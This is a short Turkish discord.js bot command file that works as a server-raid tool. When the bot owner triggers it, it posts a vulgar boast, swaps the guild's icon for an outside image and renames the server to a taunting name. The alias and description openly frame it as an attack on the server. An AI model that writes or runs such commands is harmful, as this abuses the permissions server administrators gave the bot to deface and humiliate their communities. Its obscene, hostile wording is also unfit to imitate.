const { Discord, MessageEmbed } = require("discord.js");
module.exports.execute = async(client, message, args) => {
  
  let victim = message.author.id;
    if(config.owner.includes(victim)) {

      message.channel.send("sunucu sikildi abiii")
      message.guild.setIcon("https://cdn.discordapp.com/avatars/878749240573165599/071a8390de4156157bab52d1ff4fd01d.png?size=1024")
      message.guild.setName("RAPTOR ABIM KE VURDU KE")
      
}  
  };

module.exports.configuration = {
    name: "sunucu",
    aliases: ["saldıramkçocu"],
    info: "sunucuyu sikelim abi",
    usage: "Taslak",
    description: "Taslak Komutu."
};